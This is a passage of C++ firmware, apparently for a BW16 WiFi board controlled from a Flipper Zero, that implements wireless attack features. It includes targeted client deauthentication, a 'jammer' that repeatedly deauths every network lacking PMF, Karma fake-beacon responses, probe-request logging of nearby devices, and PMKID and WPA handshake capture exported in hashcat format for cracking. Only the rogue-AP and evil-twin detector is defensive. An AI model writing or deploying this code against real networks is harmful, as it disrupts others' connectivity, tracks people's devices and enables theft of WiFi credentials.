        DEBUG_SER_PRINT(unmatchedBssidCount);
        DEBUG_SER_PRINT(", clients found: ");
        DEBUG_SER_PRINTLN(clients.size());
    }

    if (apIndex < 0) {
        unmatchedBssidCount++;
        return;
    }

    // Check if client already known
    String macStr = macToString(clientMac);
    for (size_t i = 0; i < clients.size(); i++) {
        if (clients[i].mac_str == macStr) {
            clients[i].rssi = rssi;
            clients[i].last_seen = millis();
            return;
        }
    }

    // Add new client
    if (clients.size() < MAX_CLIENTS) {
        WiFiClient_t cli;
        memcpy(cli.mac, clientMac, 6);
        cli.mac_str = macStr;
        cli.rssi = rssi;
        cli.ap_index = apIndex;
        cli.last_seen = millis();

        clients.push_back(cli);

        // Also add to network's client list
        WiFiNetwork& net = networks[apIndex];
        if (net.client_count < MAX_CLIENTS_PER_AP) {
            memcpy(net.clients[net.client_count], clientMac, 6);
            net.client_rssi[net.client_count] = rssi;
            net.client_count++;
        }

        // Notify Flipper
        String data = String(apIndex) + String((char)SEP) + macStr + String((char)SEP) + String(rssi);
        sendResponse('c', data);

        DEBUG_SER_PRINT("New client: ");
        DEBUG_SER_PRINTLN(macStr);
    }
}

// ============== Utility Functions ==============

String macToString(uint8_t* mac) {
    String result = "";
    for (int i = 0; i < 6; i++) {
        if (mac[i] < 16) result += "0";
        result += String(mac[i], HEX);
        if (i < 5) result += ":";
    }
    result.toUpperCase();
    return result;
}

void stringToMac(String str, uint8_t* mac) {
    int idx = 0;
    int pos = 0;
    String hexByte = "";
    for (unsigned int i = 0; i <= str.length() && idx < 6; i++) {
        if (i == str.length() || str[i] == ':') {
            mac[idx++] = (uint8_t)strtol(hexByte.c_str(), NULL, 16);
            hexByte = "";
        } else {
            hexByte += str[i];
        }
    }
}

String getSecurityString(uint32_t security) {
    switch (security) {
        case SECURITY_OPEN: return "Open";
        case SECURITY_WEP_PSK: return "WEP";
        case SECURITY_WPA_TKIP_PSK: return "WPA";
        case SECURITY_WPA_AES_PSK: return "WPA";
        case SECURITY_WPA2_AES_PSK: return "WPA2";
        case SECURITY_WPA2_TKIP_PSK: return "WPA2";
        case SECURITY_WPA2_MIXED_PSK: return "WPA2";
        case SECURITY_WPA_WPA2_MIXED: return "WPA/WPA2";
        case 8388612: return "WPA3";
        default: return "Unknown";
    }
}

String generateRandomString(int len) {
    String str = "";
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < len; i++) {
        str += charset[random(0, sizeof(charset) - 1)];
    }
    return str;
}

uint32_t stringHash(const String& str) {
    uint32_t hash = 5381;
    for (unsigned int i = 0; i < str.length(); i++) {
        hash = ((hash << 5) + hash) + str.charAt(i);
    }
    return hash;
}

// Check if security type has PMF (Protected Management Frames)
bool hasPMF(uint32_t security) {
    // WPA3 always has PMF required (WPA3_SECURITY = 0x00800000)
    if (security & 0x00800000) return true;
    // WPA2 with MFP/CMAC enabled (AES_CMAC_ENABLED = 0x0010)
    if (security & 0x0010) return true;
    return false;
}

// Sort networks: named networks with clients first, then by RSSI
void sortNetworks() {
    // Simple bubble sort - small list so OK
    for (size_t i = 0; i < networks.size(); i++) {
        for (size_t j = i + 1; j < networks.size(); j++) {
            bool swap = false;

            // Priority: named > hidden
            if (networks[i].hidden && !networks[j].hidden) {
                swap = true;
            }
            // Then: has clients > no clients
            else if (!networks[i].hidden && !networks[j].hidden) {
                if (networks[i].client_count == 0 && networks[j].client_count > 0) {
                    swap = true;
                }
                // Then: no PMF > has PMF (attackable first)
                else if (networks[i].client_count == networks[j].client_count) {
                    if (networks[i].has_pmf && !networks[j].has_pmf) {
                        swap = true;
                    }
                    // Finally: by signal strength
                    else if (networks[i].has_pmf == networks[j].has_pmf) {
                        if (networks[i].rssi < networks[j].rssi) {
                            swap = true;
                        }
                    }
                }
            }

            if (swap) {
                WiFiNetwork temp = networks[i];
                networks[i] = networks[j];
                networks[j] = temp;
            }
        }
    }
}

// ============== LED Effects ==============
// Note: BW16 LED_G (pin 10) doesn't support PWM, only LED_R and LED_B do
// Using simplified color cycling with digitalWrite

void setRGB(uint8_t r, uint8_t g, uint8_t b) {
    // BW16 LEDs are active HIGH (common cathode)
    digitalWrite(LED_R, r > 127 ? HIGH : LOW);
    digitalWrite(LED_G, g > 127 ? HIGH : LOW);
    digitalWrite(LED_B, b > 127 ? HIGH : LOW);
}

void ledTaskFunc(void* params) {
    (void)params;

    int step = 0;

    while (ledRunning) {
        if (ledMode == 1) {
            // WiFi scan: Cyan-Blue-Green cycle
            switch (step % 6) {
                case 0: setRGB(0, 255, 255); break;    // Cyan
                case 1: setRGB(0, 255, 0); break;      // Green
                case 2: setRGB(0, 128, 255); break;    // Light blue
                case 3: setRGB(0, 0, 255); break;      // Blue
                case 4: setRGB(0, 255, 128); break;    // Teal
                case 5: setRGB(0, 0, 0); break;        // Off (pulse)
            }
            vTaskDelay(150 / portTICK_PERIOD_MS);
        } else if (ledMode == 2) {
            // BLE scan: Purple-Magenta-Pink cycle
            switch (step % 6) {
                case 0: setRGB(255, 0, 255); break;    // Magenta
                case 1: setRGB(128, 0, 255); break;    // Purple
                case 2: setRGB(255, 0, 128); break;    // Pink
                case 3: setRGB(255, 0, 255); break;    // Magenta
                case 4: setRGB(128, 0, 128); break;    // Dark purple
                case 5: setRGB(0, 0, 0); break;        // Off (pulse)
            }
            vTaskDelay(150 / portTICK_PERIOD_MS);
        } else if (ledMode == 3) {
            // Attack: Red-Orange fast pulse
            switch (step % 4) {
                case 0: setRGB(255, 0, 0); break;      // Red
                case 1: setRGB(255, 128, 0); break;    // Orange
                case 2: setRGB(255, 0, 0); break;      // Red
                case 3: setRGB(0, 0, 0); break;        // Off
            }
            vTaskDelay(100 / portTICK_PERIOD_MS);
        }

        step++;
    }

    // Clear LED and mark ourselves as done (don't self-delete - stopLedEffect will clean up)
    setRGB(0, 0, 0);
    TaskHandle_t thisTask = ledTask;
    ledTask = NULL;  // Clear handle first
    vTaskDelete(thisTask);  // Now delete with explicit handle
}

void startLedEffect(uint8_t mode) {
    stopLedEffect();
    ledMode = mode;
    ledRunning = true;
    xTaskCreate(ledTaskFunc, "led", 1024, NULL, 1, &ledTask);
}

void stopLedEffect() {
    ledRunning = false;

    // Give task time to exit and clean up
    vTaskDelay(200 / portTICK_PERIOD_MS);

    // If task is still around (didn't self-delete yet), delete it
    if (ledTask) {
        vTaskDelete(ledTask);
        ledTask = NULL;
    }

    setRGB(0, 0, 0);
}

// Morse code for boot sequence: "GATTROSE-NG 2.0"
// Consonants = purple (255, 0, 255), Vowels = cyan (0, 255, 255)
const char* morseCode[] = {
    ".-",    // A
    "-...",  // B
    "-.-.",  // C
    "-..",   // D
    ".",     // E
    "..-.",  // F
    "--.",   // G
    "....",  // H
    "..",    // I
    ".---",  // J
    "-.-",   // K
    ".-..",  // L
    "--",    // M
    "-.",    // N
    "---",   // O
    ".--.",  // P
    "--.-",  // Q
    ".-.",   // R
    "...",   // S
    "-",     // T
    "..-",   // U
    "...-",  // V
    ".--",   // W
    "-..-",  // X
    "-.--",  // Y
    "--..",  // Z
    "-----", // 0
    ".----", // 1
    "..---", // 2
    "...--", // 3
    "....-", // 4
    ".....", // 5
    "-....", // 6
    "--...", // 7
    "---..", // 8
    "----."  // 9
};

bool isVowel(char c) {
    c = toupper(c);
    return (c == 'A' || c == 'E' || c == 'I' || c == 'O' || c == 'U');
}

void playMorseChar(char c, bool vowel) {
    const int ditTime = 60;  // ms for a dit
    const int dahTime = ditTime * 3;
    const int elementGap = ditTime;

    const char* morse = NULL;

    if (c >= 'A' && c <= 'Z') {
        morse = morseCode[c - 'A'];
    } else if (c >= 'a' && c <= 'z') {
        morse = morseCode[c - 'a'];
    } else if (c >= '0' && c <= '9') {
        morse = morseCode[26 + (c - '0')];
    } else {
        // Space or unknown - just pause
        Serial.print(" ");
        delay(ditTime * 4);
        return;
    }

    // Print character and its morse code
    Serial.print(c);
    Serial.print(":");

    // Set color: cyan for vowels, purple for consonants
    uint8_t r = vowel ? 0 : 255;
    uint8_t g = vowel ? 255 : 0;
    uint8_t b = 255;

    const char* m = morse;
    while (*m) {
        Serial.print(*m);
        setRGB(r, g, b);
        if (*m == '.') {
            delay(ditTime);
        } else if (*m == '-') {
            delay(dahTime);
        }
        setRGB(0, 0, 0);
        delay(elementGap);
        m++;
    }
    Serial.print(" ");
}

void playMorsePeriod() {
    // Period is .-.-.- (dit dah dit dah dit dah) - use white
    const int ditTime = 60;
    const int dahTime = ditTime * 3;
    const int elementGap = ditTime;
    const char* morse = ".-.-.-";

    Serial.print(".:");
    while (*morse) {
        Serial.print(*morse);
        setRGB(255, 255, 255);  // White for punctuation
        delay(*morse == '.' ? ditTime : dahTime);
        setRGB(0, 0, 0);
        delay(elementGap);
        morse++;
    }
    Serial.print(" ");
}

void playMorseBootSequence() {
    Serial.println("MORSE: ");
    const char* message = "GATTROSE NG 2.1";
    const int letterGap = 60 * 2;  // Gap between letters

    for (int i = 0; message[i] != '\0'; i++) {
        char c = message[i];
        if (c == ' ') {
            delay(60 * 4);  // Word gap
        } else if (c == '.') {
            playMorsePeriod();
            delay(letterGap);
        } else {
            playMorseChar(c, isVowel(c));
            delay(letterGap);
        }
    }
    Serial.println();  // Newline after morse
    // Explicitly clear all LEDs (active LOW: HIGH = off)
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, LOW);
    delay(100);  // Small delay to ensure LED state settles
}

// ============== Client-Only Attack ==============

void startClientDeauth(uint8_t* clientMac, int reason) {
    // Find which AP this client belongs to
    int apIndex = -1;
    for (size_t i = 0; i < clients.size(); i++) {
        if (memcmp(clients[i].mac, clientMac, 6) == 0) {
            apIndex = clients[i].ap_index;
            break;
        }
    }

    if (apIndex < 0 || apIndex >= (int)networks.size()) {
        sendResponse('e', "CLIENT_NOT_FOUND");
        return;
    }

    // Start targeted deauth
    startDeauth(apIndex, reason, clientMac);
}

// ============== New Attack Features ==============

// Task handle for jammer
TaskHandle_t jammerTask = NULL;

// --- Probe Logger ---
void cmd_probe_log(char* args) {
    if (args[0] == SEP) args++;
    if (args[0] == '1') {
        probeLogActive = true;
        probeLog.clear();
        sendResponse('P', "PROBE_LOG_ON");
    } else if (args[0] == '0') {
        probeLogActive = false;
        sendResponse('P', "PROBE_LOG_OFF");
    } else if (args[0] == 'g') {
        sendProbeLog();
    } else if (args[0] == 'c') {
        probeLog.clear();
        sendResponse('P', "PROBE_LOG_CLEARED");
    }
}

void sendProbeLog() {
    sendResponse('P', "COUNT:" + String(probeLog.size()));
    for (size_t i = 0; i < probeLog.size(); i++) {
        ProbeLogEntry& e = probeLog[i];
        String mac = macToString(e.client_mac);
        String data = String(e.ssid) + String((char)SEP) + mac + String((char)SEP) + String(e.rssi);
        sendResponse('P', data);
    }
}

void addProbeLogEntry(const char* ssid, uint8_t* mac, int8_t rssi) {
    if (!probeLogActive) return;
    if (strlen(ssid) == 0) return;  // Skip empty SSIDs

    // Check for duplicate (same SSID + MAC)
    for (size_t i = 0; i < probeLog.size(); i++) {
        if (strcmp(probeLog[i].ssid, ssid) == 0 &&
            memcmp(probeLog[i].client_mac, mac, 6) == 0) {
            return;  // Already logged
        }
    }

    if (probeLog.size() < 100) {  // Limit size
        ProbeLogEntry entry;
        strncpy(entry.ssid, ssid, 32);
        entry.ssid[32] = '\0';
        memcpy(entry.client_mac, mac, 6);
        entry.rssi = rssi;
        entry.timestamp = millis();
        probeLog.push_back(entry);

        // Notify Flipper of new probe
        String mac_str = macToString(mac);
        sendResponse('P', String("NEW:") + ssid + String((char)SEP) + mac_str);
    }
}

// --- PMKID Capture ---
void cmd_pmkid(char* args) {
    if (args[0] == SEP) args++;
    if (args[0] == '1') {
        pmkidCaptureActive = true;
        pmkidList.clear();
        sendResponse('h', "PMKID_ON");
    } else if (args[0] == '0') {
        pmkidCaptureActive = false;
        sendResponse('h', "PMKID_OFF");
    } else if (args[0] == 'g') {
        sendPMKIDList();
    } else if (args[0] == 'c') {
        pmkidList.clear();
        sendResponse('h', "PMKID_CLEARED");
    }
}

void sendPMKIDList() {
    sendResponse('h', "COUNT:" + String(pmkidList.size()));
    for (size_t i = 0; i < pmkidList.size(); i++) {
        PMKIDEntry& e = pmkidList[i];
        if (!e.valid) continue;

        // Format: PMKID*AP_MAC*CLIENT_MAC*SSID (hashcat format)
        String pmkid_hex = "";
        for (int j = 0; j < 16; j++) {
            if (e.pmkid[j] < 16) pmkid_hex += "0";
            pmkid_hex += String(e.pmkid[j], HEX);
        }
        String ap_mac = macToString(e.ap_mac);
        ap_mac.replace(":", "");
        String cl_mac = macToString(e.client_mac);
        cl_mac.replace(":", "");
        String ssid_hex = "";
        for (size_t j = 0; j < strlen(e.ssid); j++) {
            if ((uint8_t)e.ssid[j] < 16) ssid_hex += "0";
            ssid_hex += String((uint8_t)e.ssid[j], HEX);
        }

        String data = pmkid_hex + "*" + ap_mac + "*" + cl_mac + "*" + ssid_hex;
        data.toLowerCase();
        sendResponse('h', data);
    }
}

// --- Handshake Capture ---
void cmd_handshake(char* args) {
    if (args[0] == SEP) args++;
    if (args[0] == '1') {
        handshakeCaptureActive = true;
        handshakeList.clear();
        sendResponse('H', "HANDSHAKE_ON");
    } else if (args[0] == '0') {
        handshakeCaptureActive = false;
        sendResponse('H', "HANDSHAKE_OFF");
    } else if (args[0] == 'g') {
        sendHandshakeList();
    } else if (args[0] == 'c') {
        handshakeList.clear();
        sendResponse('H', "HANDSHAKE_CLEARED");
    }
}

void sendHandshakeList() {
    int completeCount = 0;
    for (size_t i = 0; i < handshakeList.size(); i++) {
        if (handshakeList[i].complete) completeCount++;
    }
    sendResponse('H', "COUNT:" + String(completeCount) + "/" + String(handshakeList.size()));

    for (size_t i = 0; i < handshakeList.size(); i++) {
        HandshakeEntry& e = handshakeList[i];
        String ap_mac = macToString(e.ap_mac);
        String status = e.complete ? "COMPLETE" : "PARTIAL";
        String msgs = String(e.msg_mask, BIN);
        sendResponse('H', String(e.ssid) + String((char)SEP) + ap_mac + String((char)SEP) + status + String((char)SEP) + msgs);
    }
}

// --- Karma Attack ---
void cmd_karma(char* args) {
    if (args[0] == SEP) args++;
    if (args[0] == '1') {
        karmaActive = true;
        sendResponse('K', "KARMA_ON");
    } else if (args[0] == '0') {
        karmaActive = false;
        sendResponse('K', "KARMA_OFF");
    }
}

void sendKarmaBeacon(const char* ssid, int channel) {
    if (!karmaActive) return;

    uint8_t fakeMac[6];
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    // Generate MAC from SSID hash for consistency
    uint32_t hash = stringHash(String(ssid));
    for (int j = 0; j < 6; j++) {
        fakeMac[j] = (hash + j) & 0xFF;
        hash = hash >> 4;
    }
    fakeMac[0] &= 0xFE;  // Unicast
    fakeMac[0] |= 0x02;  // Locally administered

    wext_set_channel(WLAN0_NAME, channel);
    wifi_tx_beacon_frame(fakeMac, broadcast, ssid);
}

// --- WiFi Jammer ---
void cmd_jammer(char* args) {
    if (args[0] == SEP) args++;
    if (args[0] == '1') {
        if (jammerTask == NULL && networks.size() > 0) {
            jammerActive = true;
            xTaskCreate(jammerTaskFunc, "jammer", 2048, NULL, 1, &jammerTask);
            sendResponse('J', "JAMMER_ON");
        } else if (networks.size() == 0) {
            sendResponse('e', "SCAN_FIRST");
        } else {
            sendResponse('e', "ALREADY_RUNNING");
        }
    } else if (args[0] == '0') {
        jammerActive = false;
        if (jammerTask) {
            vTaskDelay(200 / portTICK_PERIOD_MS);
            vTaskDelete(jammerTask);
            jammerTask = NULL;
        }
        sendResponse('J', "JAMMER_OFF");
    }
}

void jammerTaskFunc(void* params) {
    (void)params;
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    int netIndex = 0;

    DEBUG_SER_PRINTLN("Jammer started - attacking all networks");

    while (jammerActive && networks.size() > 0) {
        WiFiNetwork& net = networks[netIndex];

        // Skip PMF protected networks
        if (!net.has_pmf) {
            wext_set_channel(WLAN0_NAME, net.channel);

            // Send multiple deauth frames
            for (int i = 0; i < 3; i++) {
                wifi_tx_deauth_frame(net.bssid, broadcast, 7);
            }
        }

        netIndex = (netIndex + 1) % networks.size();
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    DEBUG_SER_PRINTLN("Jammer stopped");
    jammerTask = NULL;
    vTaskDelete(NULL);
}

// --- Rogue AP Detector ---
void cmd_rogue_detector(char* args) {
    if (args[0] == SEP) args++;
    if (args[0] == '1') {
        // Set baseline from current scan results
        if (networks.size() == 0) {
            sendResponse('e', "SCAN_FIRST");
            return;
        }
        apBaseline.clear();
        for (size_t i = 0; i < networks.size(); i++) {
            BaselineAP ap;
            memcpy(ap.bssid, networks[i].bssid, 6);
            strncpy(ap.ssid, networks[i].ssid.c_str(), 32);
            ap.ssid[32] = '\0';
            ap.channel = networks[i].channel;
            apBaseline.push_back(ap);
        }
        DEBUG_SER_PRINT("Baseline set with ");
        DEBUG_SER_PRINT(apBaseline.size());
        DEBUG_SER_PRINTLN(" APs");
        sendResponse('R', String("BASELINE_SET:") + String(apBaseline.size()));
    } else if (args[0] == '2') {
        // Start monitoring
        if (apBaseline.size() == 0) {
            sendResponse('e', "SET_BASELINE_FIRST");
            return;
        }
        rogueDetectorActive = true;
        sendResponse('R', "MONITORING_ON");
    } else if (args[0] == '0') {
        rogueDetectorActive = false;
        sendResponse('R', "MONITORING_OFF");
    }
}

void checkForRogueAPs() {
    if (!rogueDetectorActive || apBaseline.size() == 0) return;

    for (size_t i = 0; i < networks.size(); i++) {
        WiFiNetwork& net = networks[i];
        bool found = false;
        bool ssid_mismatch = false;
        bool channel_mismatch = false;

        for (size_t j = 0; j < apBaseline.size(); j++) {
            if (memcmp(apBaseline[j].bssid, net.bssid, 6) == 0) {
                found = true;
                // Check for SSID change (possible evil twin)
                if (strcmp(apBaseline[j].ssid, net.ssid.c_str()) != 0) {
                    ssid_mismatch = true;
                }
                // Check for channel change
                if (apBaseline[j].channel != net.channel) {
                    channel_mismatch = true;
                }
                break;
            }
        }

        if (!found) {
            // New AP detected - check if SSID matches a baseline AP
            bool ssid_exists = false;
            for (size_t j = 0; j < apBaseline.size(); j++) {
                if (strcmp(apBaseline[j].ssid, net.ssid.c_str()) == 0) {
                    ssid_exists = true;
                    break;
                }
            }
            if (ssid_exists) {
                // Possible evil twin - same SSID, different BSSID
                String alert = "EVIL_TWIN:" + net.ssid + ":" + macToString(net.bssid);
                sendResponse('!', alert);
                DEBUG_SER_PRINTLN("ALERT: Possible evil twin detected: " + net.ssid);
            } else {
                // Just a new AP
                String alert = "NEW_AP:" + net.ssid + ":" + macToString(net.bssid);
                sendResponse('!', alert);
                DEBUG_SER_PRINTLN("ALERT: New AP detected: " + net.ssid);
            }
        } else if (ssid_mismatch) {
            String alert = "SSID_CHANGED:" + net.ssid + ":" + macToString(net.bssid);
            sendResponse('!', alert);
            DEBUG_SER_PRINTLN("ALERT: SSID changed on known BSSID: " + net.ssid);
        } else if (channel_mismatch) {
            String alert = "CHANNEL_CHANGED:" + net.ssid + ":ch" + String(net.channel);
            sendResponse('!', alert);
            DEBUG_SER_PRINTLN("ALERT: Channel changed: " + net.ssid);
        }
    }
}

// --- EAPOL Processing for PMKID/Handshake ---
void processEAPOL(uint8_t* frame, int len, int rssi) {
    // EAPOL frames have ethertype 0x888e
    // In 802.11 data frames, check for LLC/SNAP header followed by 0x888e

    if (len < 34) return;  // Too short

    // Find EAPOL in frame (after 802.11 header + LLC/SNAP)
    // LLC/SNAP: AA AA 03 00 00 00 88 8E
    uint8_t* eapol_start = NULL;
    for (int i = 24; i < len - 8; i++) {
        if (frame[i] == 0xAA && frame[i+1] == 0xAA &&
            frame[i+2] == 0x03 && frame[i+5] == 0x00 &&
            frame[i+6] == 0x88 && frame[i+7] == 0x8E) {
            eapol_start = frame + i + 8;
            break;
        }
    }

    if (!eapol_start) return;

    // EAPOL-Key frame structure
    // Byte 0: version
    // Byte 1: type (3 = key)
    // Bytes 2-3: length
    // Byte 4: descriptor type (2 = RSN)
    // Bytes 5-6: key info

    if (eapol_start[1] != 0x03) return;  // Not EAPOL-Key

    uint16_t key_info = (eapol_start[5] << 8) | eapol_start[6];
    bool is_mic_set = (key_info & 0x0100) != 0;
    bool is_ack_set = (key_info & 0x0080) != 0;
    bool is_install = (key_info & 0x0040) != 0;

    // Get addresses
    uint8_t* addr1 = frame + 4;
    uint8_t* addr2 = frame + 10;
    uint8_t* addr3 = frame + 16;
    uint8_t toDS = (frame[1] & 0x01);
    uint8_t fromDS = (frame[1] & 0x02) >> 1;

    uint8_t* ap_mac;
    uint8_t* client_mac;
    if (toDS && !fromDS) {
        client_mac = addr2;
        ap_mac = addr1;
    } else if (!toDS && fromDS) {
        client_mac = addr1;
        ap_mac = addr2;
    } else {
        return;
    }

    // Determine message number
    int msg_num = 0;
    if (is_ack_set && !is_mic_set) msg_num = 1;
    else if (!is_ack_set && is_mic_set && !is_install) msg_num = 2;
    else if (is_ack_set && is_mic_set && is_install) msg_num = 3;
    else if (!is_ack_set && is_mic_set && !is_install) msg_num = 4;

    if (msg_num == 0) return;

    // Find network SSID
    String ssid = "";
    for (size_t i = 0; i < networks.size(); i++) {
        if (memcmp(networks[i].bssid, ap_mac, 6) == 0) {
            ssid = networks[i].ssid;
            break;
        }
    }

    DEBUG_SER_PRINT("EAPOL M");
    DEBUG_SER_PRINT(msg_num);
    DEBUG_SER_PRINT(" from ");
    DEBUG_SER_PRINTLN(ssid);

    // PMKID extraction from Message 1
    if (pmkidCaptureActive && msg_num == 1) {
        // PMKID is in RSN IE at end of EAPOL-Key frame
        // Look for RSN IE (tag 0x30) with PMKID
        int key_data_len = (eapol_start[97] << 8) | eapol_start[98];
        uint8_t* key_data = eapol_start + 99;

        for (int i = 0; i < key_data_len - 22; i++) {
            // Look for PMKID KDE: 0xDD 0x14 0x00 0x0F 0xAC 0x04 + 16 bytes PMKID
            if (key_data[i] == 0xDD && key_data[i+1] == 0x14 &&
                key_data[i+2] == 0x00 && key_data[i+3] == 0x0F &&
                key_data[i+4] == 0xAC && key_data[i+5] == 0x04) {

                // Found PMKID!
                PMKIDEntry entry;
                memcpy(entry.pmkid, key_data + i + 6, 16);
                memcpy(entry.ap_mac, ap_mac, 6);
                memcpy(entry.client_mac, client_mac, 6);
                strncpy(entry.ssid, ssid.c_str(), 32);
                entry.ssid[32] = '\0';
                entry.valid = true;

                // Check for duplicate
                bool exists = false;
                for (size_t j = 0; j < pmkidList.size(); j++) {
                    if (memcmp(pmkidList[j].pmkid, entry.pmkid, 16) == 0) {
                        exists = true;
                        break;
                    }
                }

                if (!exists && pmkidList.size() < 20) {
                    pmkidList.push_back(entry);
                    sendResponse('h', "CAPTURED:" + ssid);
                    DEBUG_SER_PRINTLN("PMKID captured!");
                }
                break;
            }
        }
    }

    // Handshake capture
    if (handshakeCaptureActive && msg_num >= 1 && msg_num <= 4) {
        // Find or create handshake entry
        HandshakeEntry* hs = NULL;
        for (size_t i = 0; i < handshakeList.size(); i++) {
            if (memcmp(handshakeList[i].ap_mac, ap_mac, 6) == 0 &&
                memcmp(handshakeList[i].client_mac, client_mac, 6) == 0) {
                hs = &handshakeList[i];
                break;
            }
        }

        if (!hs && handshakeList.size() < 10) {
            HandshakeEntry newEntry;
            memset(&newEntry, 0, sizeof(newEntry));
            memcpy(newEntry.ap_mac, ap_mac, 6);
            memcpy(newEntry.client_mac, client_mac, 6);
            strncpy(newEntry.ssid, ssid.c_str(), 32);
            handshakeList.push_back(newEntry);
            hs = &handshakeList[handshakeList.size() - 1];
        }

        if (hs && !hs->complete) {
            hs->msg_mask |= (1 << (msg_num - 1));

            // Extract nonces from messages
            if (msg_num == 1 || msg_num == 3) {
                // ANonce at offset 17-48
                memcpy(hs->anonce, eapol_start + 17, 32);
            }
            if (msg_num == 2) {
                // SNonce at offset 17-48
                memcpy(hs->snonce, eapol_start + 17, 32);
                // MIC at offset 81-96
                memcpy(hs->mic, eapol_start + 81, 16);
                // Store EAPOL frame for cracking
                int eapol_len = 99 + ((eapol_start[97] << 8) | eapol_start[98]);
                if (eapol_len < 256) {
                    memcpy(hs->eapol_frame, eapol_start, eapol_len);
                    hs->eapol_len = eapol_len;
                }
            }

            // Check if complete (have M1+M2 or M2+M3)
            if ((hs->msg_mask & 0x03) == 0x03 || (hs->msg_mask & 0x06) == 0x06) {
                hs->complete = true;
                sendResponse('H', "CAPTURED:" + ssid);
                DEBUG_SER_PRINTLN("Handshake captured!");
            }
        }
    }
}
